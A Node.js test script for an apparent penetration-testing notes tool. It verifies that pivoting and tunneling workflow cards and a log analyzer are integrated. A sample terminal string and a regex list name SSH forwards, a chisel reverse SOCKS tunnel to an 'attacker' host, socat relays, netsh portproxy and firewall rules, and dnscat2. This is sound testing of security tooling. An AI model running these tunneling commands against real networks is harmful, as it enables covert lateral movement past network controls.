'use strict';
const assert=require('assert');
const cp=require('child_process');
const path=require('path');
const root=path.join(__dirname,'..');
function load(rel){require(path.join(root,rel));}
function run(args){const result=cp.spawnSync(process.execPath,args.map((part,index)=>index===0?path.join(root,part):part),{cwd:root,encoding:'utf8'});process.stdout.write(result.stdout||'');process.stderr.write(result.stderr||'');if(result.status!==0)process.exit(result.status||1);}
function versionAtLeast(actual,minimum){const a=String(actual||'').replace(/^v/i,'').split('.').map(Number);const b=String(minimum||'').replace(/^v/i,'').split('.').map(Number);for(let i=0;i<3;i++){const d=(a[i]||0)-(b[i]||0);if(d)return d>0;}return true;}

globalThis.__OBOL_DEFER_PRODUCT_HARDENING_EXTENSIONS__=true;
globalThis.setTimeout=undefined;
globalThis.addEventListener=undefined;

load('data/current-release.js');
assert.ok(versionAtLeast(globalThis.OBOL_CURRENT_RELEASE.label,'v9.91'),'current release should be v9.91 or newer');
assert.ok(globalThis.OBOL_CURRENT_RELEASE.productHardeningExtensions.includes('data/product-hardening/pivoting-tunneling-route-proof-cluster-v9.91.js'));
load('data/product-hardening/product-hardening-queue.js');
load('data/product-hardening/work-packages.js');
load('data/note-integration.js');
load('data/note-integration-reviews.js');
load('data/note-integration-packets.js');
load('data/product-hardening/note-mechanic-backfill-v9.38.js');
load('data/product-hardening/note-progress-current.js');
load('data/runtime-manifest.js');
for(const src of globalThis.OBOL_CURRENT_RELEASE.productHardeningExtensions)load(src);
load('data/product-hardening/build-next-queue-hygiene-current.js');

const wave=globalThis.OBOL_PIVOTING_TUNNELING_ROUTE_PROOF_CLUSTER_V991;
assert.ok(wave,'v9.91 pivoting/tunneling route-proof cluster should expose status');
assert.strictEqual(wave.status,'live-integrated');
assert.strictEqual(wave.activeQueueId,'source-note-cluster-pivoting-tunneling-and-route-proof');
assert.strictEqual(wave.clusterId,'pivoting-tunneling-and-route-proof');
assert.strictEqual(wave.nextQueueId,'source-note-cluster-metasploit-resource-post-exploitation-and-cleanup');
assert.strictEqual(wave.nextClusterId,'metasploit-resource-post-exploitation-and-cleanup');
assert.strictEqual(wave.noteCount,19);
assert.ok(wave.reviewTextChars>300000);
assert.deepStrictEqual(wave.primaryCardIds,['rdp-socks-tunnel-workflow','metasploit-resource-pivot-workflow']);
assert.deepStrictEqual(wave.failures,[]);
assert.ok(wave.notesIntegrated&&wave.cardsIntegrated&&wave.analyzerIntegrated&&wave.clusterCompleted&&wave.queuePatched);

const ownerCards=['rdp-socks-tunnel-workflow','metasploit-resource-pivot-workflow'];
for(const id of ownerCards){
 const card=globalThis.CARDS&&globalThis.CARDS[id];
 assert.ok(card,'missing folded pivot owner card '+id);
 assert.strictEqual(card.cardKind,'primary');
 assert.ok((card.featureIds||[]).includes('pivot-tunnel-route-proof-router'));
 assert.ok((card.commands||[]).length>=8,'folded owner needs route-proof command spine '+id);
 for(const row of card.commands||[])assert.ok(row.tool&&row.run&&row.when&&row.evidence&&row.note,'command row needs full action-spine fields');
 assert.ok(/route|pivot|tunnel|SOCKS|listener|proxy/i.test(card.operatorGoal+card.hypothesis+card.whyNow));
 assert.ok(!/source-mining|source re-mining|release cleanup|patch panel|\bUNKNOWN\b|methodology gap|wrapper/i.test(JSON.stringify(card)));
}
for(const bad of ['pivoting-tunneling-route-proof-wrapper-card','pivot-route-proof-wrapper-card','tunnel-route-proof-wrapper-card','chisel-wrapper-card','ssh-tunnel-wrapper-card','netsh-portproxy-wrapper-card'])assert.ok(!globalThis.CARDS[bad],'must not create duplicate wrapper card '+bad);
const allRuns=ownerCards.flatMap(id=>(globalThis.CARDS[id].commands||[]).map(row=>String(row.run||''))).join('\n');
for(const expected of [/ip addr/i,/ip route/i,/route print/i,/ssh -N -L/i,/ssh -N -R/i,/ssh -N -D/i,/plink\.exe/i,/chisel server --reverse/i,/chisel client/i,/proxychains -q nmap/i,/socat TCP-LISTEN/i,/netsh interface portproxy add/i,/netsh advfirewall firewall add rule/i,/sshuttle -r/i,/dnscat2-server/i,/portproxy delete/i])assert.ok(expected.test(allRuns),'missing pivot route command pattern '+expected);

const notes=globalThis.OBOL_NOTE_INTEGRATION.publicFieldNotes||[];
const noteIds=new Set(notes.map(note=>note&&note.id).filter(Boolean));
assert.strictEqual(wave.publicNoteIds.length,4);
for(const id of wave.publicNoteIds)assert.ok(noteIds.has(id),'missing v9.91 public field note '+id);
for(const note of notes.filter(note=>note&&wave.publicNoteIds.includes(note.id))){
 assert.deepStrictEqual(note.cardIds,ownerCards);
 assert.deepStrictEqual(note.pathIds,ownerCards);
 assert.ok((note.relatedCardIds||[]).includes('ad-password-spray-safety-workflow'));
}

const sample='ip addr ens192 inet 10.4.50.215 ip route 172.16.50.0/24 dev ens224 ssh -N -L 0.0.0.0:4455:172.16.50.217:445 user@host ssh -N -R 127.0.0.1:2345:10.4.50.215:5432 kali@attacker ssh -N -D 127.0.0.1:1080 user@host plink.exe -ssh -N -L 4455:172.16.50.217:445 chisel server --reverse --socks5 chisel client attacker:8000 R:socks proxychains -q nmap -sT -Pn -p 445 172.16.50.217 socat TCP-LISTEN:2222,fork TCP:10.4.50.215:22 netsh interface portproxy add v4tov4 listenport=2222 connectport=22 netsh advfirewall firewall add rule name=pivot localport=2222 action=allow sshuttle -r user@host 172.16.50.0/24 dnscat2-server example.test LISTENING open Connection to 172.16.50.217 succeeded filtered refused timed out netsh advfirewall firewall delete rule name=pivot OS{secret} password=BadThing 192.168.50.64';
const analysis=globalThis.OBOL_PIVOTING_TUNNELING_ROUTE_ANALYZER_V991.analyze(sample);
assert.strictEqual(analysis.analyzer,'pivoting-tunneling-route-proof-v991');
assert.deepStrictEqual(analysis.cardIds,ownerCards);
for(const fact of ['pivot.route_state_observed','pivot.ssh_forward_observed','pivot.chisel_tunnel_observed','pivot.windows_portproxy_or_firewall_observed','pivot.fallback_tunnel_observed','pivot.proxied_tool_observed','pivot.connectivity_state_observed','pivot.cleanup_state_observed'])assert.ok(analysis.outcomeFacts.includes(fact),'missing analyzer fact '+fact);
assert.ok(!/OS\{secret\}|BadThing|192\.168\.50\.64|CONFLUENCE|PGDATABASE|MULTISERVER|HRSHARES/i.test(JSON.stringify(analysis)),'analysis output should be public-safe redacted');
const intake=globalThis.OBOL_INTAKE_V21&&globalThis.OBOL_INTAKE_V21.analyzeTerminal(sample);
assert.ok(intake&&Array.isArray(intake.activities)&&intake.activities.some(row=>row.cardId==='rdp-socks-tunnel-workflow'),'intake should add pivot/tunnel route-proof activity');

const clusters=globalThis.OBOL_SOURCE_NOTE_CLUSTERS;
assert.ok(clusters&&clusters.status);
assert.strictEqual(clusters.status.latestCompletedClusterQueue,'source-note-cluster-pivoting-tunneling-and-route-proof');
assert.strictEqual(clusters.status.latestCompletedClusterId,'pivoting-tunneling-and-route-proof');
assert.deepStrictEqual(clusters.status.latestCompletedClusterOwnerCards,ownerCards);
assert.strictEqual(clusters.status.reviewedSourceNotes,499);
assert.strictEqual(clusters.status.pendingSourceNotes,57);
assert.strictEqual(clusters.status.clusteredPendingNotes,57);
assert.strictEqual(clusters.status.unclusteredPendingNotes,0);
assert.strictEqual(clusters.status.clusterCount,4);
assert.strictEqual(clusters.pendingClusters.length,4);
assert.strictEqual(clusters.reviewQueue.length,4);
assert.strictEqual(clusters.pendingClusters.reduce((sum,entry)=>sum+(entry.pendingCount||0),0),57);
assert.ok(!clusters.reviewQueue.some(entry=>entry.id==='source-note-cluster-pivoting-tunneling-and-route-proof'));
assert.ok(clusters.reviewQueue[0]&&clusters.reviewQueue[0].id==='source-note-cluster-metasploit-resource-post-exploitation-and-cleanup');
assert.deepStrictEqual(clusters.validate(),[]);

const q=globalThis.OBOL_PRODUCT_HARDENING;
assert.ok(q.nextNotesBatch);
assert.strictEqual(q.nextNotesBatch.queueMode,'cluster-review');
assert.strictEqual(q.nextNotesBatch.id,'source-note-cluster-metasploit-resource-post-exploitation-and-cleanup');
assert.strictEqual(q.nextNotesBatch.clusterId,'metasploit-resource-post-exploitation-and-cleanup');
assert.ok(/Metasploit|post-exploitation|cleanup/i.test(q.nextNotesBatch.label));
const refinement=globalThis.OBOL_PIVOTING_TUNNELING_CLUSTER_QUEUE_REFINEMENT_V991;
assert.ok(refinement&&refinement.generatedQueue&&refinement.generatedQueue.length===4);
assert.strictEqual(refinement.generatedQueue[0].id,'source-note-cluster-metasploit-resource-post-exploitation-and-cleanup');

run(['tools/validate-source-note-clusters.js']);
run(['tools/validate-product-hardening-card-routes.js']);
run(['tools/validate-note-card-path-placement.js']);
run(['tools/validate-actionable-next-step-cards.js']);
run(['tools/validate-action-first-card-cleanup.js']);
run(['tools/validate-path-card-uniqueness-v9.72.js']);
run(['tools/validate-release-pr.js','--repo-only','--release-version=9.91']);
console.log('v9.91 mined pivoting, tunneling, proxying, and route proof into existing pivot cards and advanced the cluster queue to Metasploit cleanup.');
